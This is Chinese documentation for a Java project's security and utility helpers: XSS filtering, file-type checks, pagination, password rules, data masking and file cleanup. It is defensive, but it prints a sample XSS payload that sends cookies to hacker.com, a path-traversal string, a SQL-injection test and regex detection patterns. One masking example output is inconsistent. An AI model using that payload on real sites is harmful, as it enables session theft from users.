# 工具类目录 (common/util/)

> 类比：工具类就像药铺里各种**专用器具** -- 称药的天平、切药的铡刀、研药的杵臼，每种器具解决一种特定问题。工具类的方法都是 static 的，不需要创建对象，拿来就用。

## 目录结构

```
util/
├── FileCleanupHelper.java   # 文件清理助手
├── FileTypeUtils.java       # 文件类型检测
├── PageUtils.java           # 分页工具
├── PasswordValidator.java   # 密码验证器
├── SensitiveDataUtils.java  # 敏感数据脱敏
└── XssUtils.java            # XSS防护工具
```

---

## 1. XssUtils -- XSS防护工具

> 类比：XssUtils 就像药铺的**毒物检测仪** -- 能识别30多种"毒药"（恶意脚本模式），检测到了就中和掉。

### 什么是 XSS？

XSS（Cross-Site Scripting，跨站脚本攻击）是黑客在输入框中注入恶意 JavaScript 代码的攻击方式。比如：

```html
<!-- 正常评论 -->
这味侗药真有效！

<!-- XSS攻击评论 -->
<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>
```

如果不过滤，其他用户看到这条评论时，浏览器会执行这段脚本，把用户的 Cookie 发给黑客。

### 30+ 危险模式检测

XssUtils 内置了30多种危险模式的正则检测：

```java
private static final Pattern[] DANGEROUS_PATTERNS = {
    Pattern.compile("<script", Pattern.CASE_INSENSITIVE),          // <script标签
    Pattern.compile("javascript\\s*:", Pattern.CASE_INSENSITIVE),  // javascript:协议
    Pattern.compile("vbscript\\s*:", Pattern.CASE_INSENSITIVE),    // vbscript:协议
    Pattern.compile("on\\w+=", Pattern.CASE_INSENSITIVE),          // 事件属性 onclick=等
    Pattern.compile("eval\\s*\\(", Pattern.CASE_INSENSITIVE),      // eval()函数
    Pattern.compile("expression\\s*\\(", Pattern.CASE_INSENSITIVE),// CSS expression
    Pattern.compile("<iframe", Pattern.CASE_INSENSITIVE),          // iframe标签
    Pattern.compile("<object", Pattern.CASE_INSENSITIVE),          // object标签
    Pattern.compile("<embed", Pattern.CASE_INSENSITIVE),           // embed标签
    Pattern.compile("<svg", Pattern.CASE_INSENSITIVE),             // svg标签（可内嵌脚本）
    Pattern.compile("<math", Pattern.CASE_INSENSITIVE),            // math标签
    Pattern.compile("data\\s*:", Pattern.CASE_INSENSITIVE),        // data:协议
    Pattern.compile("srcdoc\\s*=", Pattern.CASE_INSENSITIVE),      // srcdoc属性
    // ... 还有更多
};
```

### 核心方法

```java
// 1. 检测是否包含XSS -- 返回true表示有危险
boolean hasXss = XssUtils.containsXss("<script>alert('hack')</script>");  // true
boolean safe = XssUtils.containsXss("钩藤是一种侗族常用药材");            // false

// 2. 清洗XSS -- 转义特殊字符，让浏览器不执行脚本
String cleaned = XssUtils.sanitize("<script>alert('hack')</script>");
// 结果: "&lt;script&gt;alert('hack')&lt;/script&gt;"

// 3. 清洗HTML -- 移除危险标签，保留安全内容
String html = XssUtils.sanitizeHtml("<p>你好</p><script>hack()</script>");
// 结果: "<p>你好</p>"

// 4. 检测SQL注入
boolean hasSql = XssUtils.containsSqlInjection("1 OR 1=1");  // true
boolean safe2 = XssUtils.containsSqlInjection("钩藤");        // false

// 5. 去除所有HTML标签
String text = XssUtils.stripHtmlTags("<p>侗药<b>知识</b></p>");
// 结果: "侗药知识"

// 6. 转义JavaScript字符串
String js = XssUtils.escapeJavaScript("alert(\"hello\")");
// 结果: "alert(\\\"hello\\\")"

// 7. 清洗URL -- 防止 javascript: 和 data: 协议
String url = XssUtils.sanitizeUrl("javascript:alert(1)");  // 返回 ""
String url2 = XssUtils.sanitizeUrl("/api/plants");          // 返回 "/api/plants"

// 8. 清洗文件名 -- 移除特殊字符
String name = XssUtils.sanitizeFileName("../../../etc/passwd");
// 结果: "_.._.._.._etc_passwd"

// 9. 安全日志输出 -- 截断超长内容，转义换行符
String logSafe = XssUtils.sanitizeForLog(veryLongInput);
// 超过1000字符会截断，换行符转为\\n

// 10. 综合安全检查
boolean isSafe = XssUtils.isSafeInput(input, 500);
// 检查长度<=500 且 不包含XSS
```

### 常见错误

- 只用 `containsXss()` 检测但不用 `sanitize()` 清洗 -- 检测到了不处理等于白搭
- 在富文本编辑器场景用了 `sanitize()` 而不是 `sanitizeHtml()` -- `sanitize()` 会转义所有HTML标签，导致富文本内容显示为源码
- 忘记检测 SQL 注入 -- XssUtils 也能检测 SQL 注入，但需要单独调用 `containsSqlInjection()`

---

## 2. FileTypeUtils -- 文件类型检测

> 类比：FileTypeUtils 就像药铺的**药材鉴定师** -- 通过看、闻、摸（读取文件头部字节）来判断这味药材到底是什么，防止有人把假药混进来。

### Magic Byte（魔数）检测

每种文件格式的开头都有固定的字节标识，称为"魔数"（Magic Byte）。就像侗药的真伪鉴定，看药材的外观特征就能判断真假。

```java
// 文件头部魔数对照表
private static final Map<String, byte[]> FILE_SIGNATURES = Map.ofEntries(
    Map.entry("jpg",  new byte[]{(byte)0xFF, (byte)0xD8, (byte)0xFF}),  // JPEG以 FFD8FF 开头
    Map.entry("png",  new byte[]{(byte)0x89, 0x50, 0x4E, 0x47}),        // PNG以 89504E47 开头
    Map.entry("gif",  new byte[]{'G', 'I', 'F'}),                        // GIF以 GIF 开头
    Map.entry("pdf",  new byte[]{'%', 'P', 'D', 'F'}),                   // PDF以 %PDF 开头
    Map.entry("docx", new byte[]{0x50, 0x4B, 0x03, 0x04}),               // DOCX以 PK.. 开头（ZIP格式）
    Map.entry("mp4",  new byte[]{0x00, 0x00, 0x00})                      // MP4以 .... 开头
);
```

### 核心方法

```java
// 1. 获取文件类型（根据扩展名）
String type = FileTypeUtils.getFileType("钩藤.jpg");    // "image"
String type2 = FileTypeUtils.getFileType("药方.pdf");   // "document"
String type3 = FileTypeUtils.getFileType("演示.mp4");   // "video"
String type4 = FileTypeUtils.getFileType("未知.xyz");   // "other"

// 2. 获取文件扩展名
String ext = FileTypeUtils.getExtension("钩藤.jpg");  // "jpg"

// 3. 获取MIME类型
String mime = FileTypeUtils.getMimeType("钩藤.jpg");  // "image/jpeg"

// 4. 获取类型图标名（前端用）
String icon = FileTypeUtils.getTypeIcon("video");     // "VideoPlay"

// 5. 获取类型中文名
String name = FileTypeUtils.getTypeName("image");     // "图片"

// 6. 判断文件是否可预览
boolean canPreview = FileTypeUtils.isPreviewable("药方.pdf");  // true

// 7. 判断文件类型
boolean isVideo = FileTypeUtils.isVideo("演示.mp4");          // true
boolean isImage = FileTypeUtils.isImage("钩藤.jpg");          // true
boolean isDoc = FileTypeUtils.isDocument("药方.pdf");          // true

// 8. 通过文件内容验证类型（最安全的方式）
boolean valid = FileTypeUtils.validateFileContent(inputStream, "jpg");
// 读取文件头部字节，和jpg的魔数对比，一致才返回true

// 9. 检测危险扩展名
boolean dangerous = FileTypeUtils.isDangerousExtension("exe");  // true
boolean dangerous2 = FileTypeUtils.isDangerousExtension("jpg"); // false

// 10. 检测文件内容中的危险代码
boolean hasDanger = FileTypeUtils.containsDangerousContent(content);
// 检查文件内容是否包含 <script>, javascript: 等危险内容

// 11. 生成安全文件名
String safeName = FileTypeUtils.generateSafeFileName("钩藤.jpg");
// 结果: "钩藤_1713849600123_a1b2c3d4.jpg"（加时间戳和随机数防重名）

// 12. 检查路径安全性
boolean pathSafe = FileTypeUtils.isPathSafe("../../etc/passwd");  // false（路径遍历攻击）
boolean pathSafe2 = FileTypeUtils.isPathSafe("images/钩藤.jpg");  // true
```

### 危险扩展名列表

```
exe, bat, cmd, com, pif, scr,     # Windows可执行文件
vbs, js, jar,                      # 脚本文件
sh, bash, zsh,                     # Linux脚本
php, asp, aspx, jsp, cgi,         # Web脚本
dll, so, dylib,                    # 动态链接库
app, deb, rpm, dmg, pkg            # 安装包
```

### 常见错误

- 只检查扩展名不检查文件内容 -- 黑客可以把 .exe 改名为 .jpg 上传
- 忘记检查路径安全性，导致路径遍历攻击（`../../etc/passwd`）
- `generateSafeFileName()` 生成的文件名太长，超过文件系统限制

---

## 3. PageUtils -- 分页工具

> 类比：PageUtils 就像药铺的**药方分页器** -- 药方太长一页放不下，需要按页展示，每页固定条数。

### 核心方法

```java
// 1. 创建分页对象（带边界检查）
// 用户传了 page=-1 或 size=999 怎么办？PageUtils 会自动修正
Page<Plant> page = PageUtils.getPage(-1, 999);
// 实际: page=1, size=100（最小1，最大100）

Page<Plant> page2 = PageUtils.getPage(null, null);
// 实际: page=1, size=20（默认值）

// 2. 转义SQL LIKE特殊字符
// 用户搜索 "100%" 时，% 是LIKE通配符，需要转义
String keyword = PageUtils.escapeLike("100%");
// 结果: "100\\%"  -- % 被转义，不会被当成通配符

String keyword2 = PageUtils.escapeLike("test_1");
// 结果: "test\\_1"  -- _ 也被转义

// 3. 将分页结果转为Map（给前端用）
Page<Plant> pageResult = plantMapper.selectPage(page, wrapper);
Map<String, Object> data = PageUtils.toMap(pageResult);
// 结果: {"records": [...], "total": 100, "page": 1, "size": 20}
```

### 为什么需要 escapeLike？

在 SQL 的 LIKE 查询中，`%` 表示"任意多个字符"，`_` 表示"任意一个字符"。如果用户搜索的关键词中包含这些字符，会导致查询结果不准确：

```sql
-- 用户想搜索 "100%" 这个文字
-- 不转义：WHERE name LIKE '%100%%'     -- % 被当成通配符，结果不对
-- 转义后：WHERE name LIKE '%100\%%' ESCAPE '\'  -- 正确搜索 "100%"
```

### 常见错误

- 忘记调用 `escapeLike()`，导致用户输入的 `%` 和 `_` 被当成通配符
- 分页参数不做边界检查，用户传 `page=0` 或 `size=99999` 导致问题
- `toMap()` 返回的 key 和前端期望的不一致

---

## 4. PasswordValidator -- 密码验证器

> 类比：PasswordValidator 就像药铺的**锁匠** -- 检查你选的锁够不够安全，太简单的锁（弱密码）不让用。

### 密码规则

| 规则 | 要求 | 原因 |
|------|------|------|
| 最短长度 | 8位 | 太短容易被暴力破解 |
| 最长长度 | 50位 | 防止超长输入攻击 |
| 必须包含字母 | a-z 或 A-Z | 纯数字太简单 |
| 必须包含数字 | 0-9 | 纯字母太简单 |
| 不能有空格 | -- | 空格可能导致登录问题 |

### 强度评分

```java
// 密码强度评分规则（满分5分）
int score = 0;
if (密码长度 >= 8)  score++;   // +1: 长度达标
if (密码长度 >= 12) score++;   // +1: 长度较长
if (密码长度 >= 16) score++;   // +1: 长度很长
if (包含字母)       score++;   // +1: 有字母
if (大小写混合)     score++;   // +1: 大小写都有
if (包含数字)       score++;   // +1: 有数字
if (连续2个以上数字) score++;   // +1: 数字较多
if (包含特殊字符)   score++;   // +1: 有特殊字符
if (连续2个以上特殊字符) score++; // +1: 特殊字符较多
// 最终取 min(score, 5)
```

| 分数 | 等级 | 示例 |
|------|------|------|
| 0-1 | 弱 | `abc12345` |
| 2 | 一般 | `Abc12345` |
| 3 | 中等 | `Abc12345!` |
| 4 | 强 | `Abc@12345xyz` |
| 5 | 非常强 | `Abc@12345xyz!Q` |

### 使用示例

```java
// 基本验证
PasswordValidator.ValidationResult result = PasswordValidator.validate("Abc12345");

if (result.isValid()) {
    // 密码合法
    System.out.println("强度: " + result.getStrength());        // 3
    System.out.println("等级: " + result.getStrengthLabel());   // "中等"
} else {
    // 密码不合法
    System.out.println("错误: " + result.getMessage());         // 具体错误信息
}

// 快速判断
boolean valid = PasswordValidator.isValid("123");  // false（太短，没有字母）
```

### 常见错误

- 只检查密码不为空，不检查强度 -- 用户设 "123456" 这样的弱密码
- 在前端做了密码验证但后端没做 -- 前端验证可以被绕过
- 强度评分和实际安全要求不匹配 -- 根据项目需求调整评分规则

---

## 5. SensitiveDataUtils -- 敏感数据脱敏

> 类比：SensitiveDataUtils 就像药铺的**隐私保护章** -- 在药方上盖住患者姓名、地址等隐私信息，只露出必要部分。

### 支持脱敏的数据类型

| 数据类型 | 正则匹配规则 | 脱敏效果 |
|----------|-------------|----------|
| 手机号 | `1[3-9]开头的11位数字` | `138****5678` |
| 邮箱 | `xxx@xxx.xxx` | `te***@qq.com` |
| 身份证号 | 18位身份证格式 | `430102********1234` |
| 银行卡号 | 16-19位连续数字 | `6222****1234` |
| JWT Token | `eyJ...eyJ...xxx` | 首尾各10位，中间 `...` |
| SQL敏感值 | `password='xxx'` | `password='***'` |

### 核心方法

```java
// 1. 自动脱敏 -- 检测并替换所有类型的敏感数据
String safe = SensitiveDataUtils.autoMask(
    "用户13812345678登录成功，邮箱test@qq.com，token=eyJhbGciOiJIUzUxMiJ9.xxx"
);
// 结果: "用户138****5678登录成功，邮箱te***@qq.com，token=eyJhbGciOi...xxx"

// 2. 按字段名脱敏 -- 如果字段名是敏感字段，自动脱敏值
String masked = SensitiveDataUtils.mask("password", "abc12345");
// 结果: "ab****45"（因为password是敏感字段名）

String notMasked = SensitiveDataUtils.mask("username", "zhangsan");
// 结果: "zhangsan"（username不是敏感字段名）

// 3. 判断字段名是否敏感
boolean sensitive = SensitiveDataUtils.isSensitiveField("password");   // true
boolean sensitive2 = SensitiveDataUtils.isSensitiveField("username"); // false

// 4. 脱敏值 -- 不看字段名，直接脱敏
String val = SensitiveDataUtils.maskValue("abc12345");
// 结果: "ab****45"（保留首尾2位，中间用星号）

// 5. JSON脱敏 -- 自动脱敏JSON中的敏感字段
String json = SensitiveDataUtils.maskJson(
    "{\"username\":\"zhangsan\",\"password\":\"abc123\",\"phone\":\"13812345678\"}"
);
// 结果: {"username":"zhangsan","password":"ab****45","phone":"138****5678"}
```

### 敏感字段名列表

以下字段名会被自动识别为敏感字段：

```
password, passwd, pwd          # 密码
secret, token, accessToken     # 令牌
apiKey, apiSecret              # API密钥
idCard, idCardNumber           # 身份证
phone, mobile, telephone       # 手机号
email, mail                    # 邮箱
bankCard, bankAccount          # 银行卡
address, addr                  # 地址
realName, truename             # 真实姓名
jwt, authorization             # JWT/认证
```

### 常见错误

- `autoMask()` 可能误判 -- 11位数字不一定是手机号（如订单号），但也会被脱敏
- `maskJson()` 只处理简单的 JSON 格式，嵌套很深或格式特殊可能遗漏
- 忘记在日志输出时使用脱敏 -- 直接 `log.info("用户信息: {}", user)` 会打印明文

---

## 6. FileCleanupHelper -- 文件清理助手

> 类比：FileCleanupHelper 就像药铺的**清洁工** -- 当药材信息被删除时，对应的图片、视频文件也要一起清理掉，不然硬盘会被无用文件占满。

### 核心方法

```java
@Component
public class FileCleanupHelper {

    // 从JSON路径字符串中删除所有文件
    // 支持两种格式: ["path1","path2"] 或 [{"path":"p1","url":"u1"}]
    public void deleteFilesFromJson(String jsonPath) {
        // 解析JSON --> 逐个删除文件
    }

    // 删除单个文件
    public void deleteSingleFile(String filePath) {
        // 规范化路径 --> 调用 FileUploadService 删除
    }
}
```

### 使用场景

当管理员删除一个药用植物记录时，该植物的图片和视频文件也应该被删除：

```java
@Service
public class PlantServiceImpl implements PlantService {

    @Autowired
    private FileCleanupHelper fileCleanupHelper;

    public void deletePlant(Integer id) {
        Plant plant = plantMapper.selectById(id);
        if (plant != null) {
            // 先删除数据库记录
            plantMapper.deleteById(id);
            // 再清理关联的文件
            fileCleanupHelper.deleteFilesFromJson(plant.getImages());
            fileCleanupHelper.deleteFilesFromJson(plant.getVideos());
        }
    }
}
```

### 常见错误

- 先删文件再删数据库记录 -- 如果数据库删除失败，文件已经没了，数据不一致
- 路径没有规范化（如以 `/` 开头），导致文件找不到
- 忘记处理文件删除失败的情况 -- 应该记录日志但不影响主流程

---

## 工具类速查表

| 工具类 | 解决什么问题 | 最常用方法 |
|--------|-------------|-----------|
| XssUtils | 防XSS攻击 | `containsXss()`, `sanitize()` |
| FileTypeUtils | 文件类型判断 | `getFileType()`, `validateFileContent()`, `isDangerousExtension()` |
| PageUtils | 分页处理 | `getPage()`, `escapeLike()`, `toMap()` |
| PasswordValidator | 密码强度验证 | `validate()`, `isValid()` |
| SensitiveDataUtils | 敏感数据脱敏 | `autoMask()`, `mask()`, `maskJson()` |
| FileCleanupHelper | 文件清理 | `deleteFilesFromJson()`, `deleteSingleFile()` |

---

## 代码审查与改进建议

- **[性能] PasswordValidator.calculateStrength()中重复编译正则表达式**：应提取为`static final Pattern`常量
- **[性能] SensitiveDataUtils.autoMask()对每条日志执行6次正则匹配**：高吞吐量场景性能影响显著
- **[安全] XssUtils.sanitizeHtml()正则替换不彻底**：黑名单方式容易被绕过
- **[结构] sanitizeFileName方法在XssUtils和FileTypeUtils中重复实现**
